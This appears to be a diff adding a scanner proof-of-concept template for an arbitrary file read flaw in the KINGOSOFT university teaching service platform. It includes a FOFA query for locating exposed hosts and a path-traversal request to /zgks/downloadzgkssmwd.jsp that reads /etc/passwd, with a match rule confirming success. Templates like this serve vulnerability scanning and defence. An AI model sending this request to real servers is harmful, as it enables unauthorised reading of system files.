@@ -1,0 +1,15 @@
+id: poc-yaml-kingosoft-usctcsp-downloadzgkssmwd-anyfile-read
+info:
+  name: KINGOSOFT高校智慧校园教学综合服务平台 downloadzgkssmwd 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 高校智慧校园教学综合服务平台
+  fofa: app="KINGOSOFT高校智慧校园教学综合服务平台"
+requests:
+- method: GET
+  path: /zgks/downloadzgkssmwd.jsp?fp=../../../../../../../../../../../etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<") && contains(headers,"filename=") && contains(content_type,"application/x-msdownload")
+variables: {}
+transport: http
